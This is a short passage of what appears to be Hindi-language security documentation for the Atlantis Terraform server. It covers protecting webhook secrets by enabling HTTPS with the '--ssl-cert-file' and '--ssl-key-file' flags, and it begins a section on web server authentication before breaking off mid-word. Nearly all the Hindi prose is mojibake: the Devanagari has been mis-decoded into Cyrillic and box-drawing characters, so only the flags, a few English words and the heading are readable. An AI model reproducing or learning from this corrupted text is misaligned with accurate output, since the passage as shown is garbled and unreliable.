рдпрджрд┐ рдЖрдк webhook secrets рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣реЗ рд╣реИрдВ рд▓реЗрдХрд┐рди рдЖрдкрдХрд╛ рдЯреНрд░реИрдлрд╝рд┐рдХ HTTP рдкрд░ рд╣реИ рддреЛ webhook secrets рдЪреЛрд░реА рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВред `--ssl-cert-file` рдФрд░ `--ssl-key-file` рдлреНрд▓реИрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ SSL/HTTPS рдХреЛ рд╕рдХреНрд╖рдо рдХрд░реЗрдВред

### Enable Authentication on Atlantis Web Server <a href="#enable-authentication-on-atlantis-web-server" id="enable-authentication-on-atlantis-web-server"></a>

рд╡реЗрдм рд╕реЗрд╡рд╛ рдореЗрдВ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╕
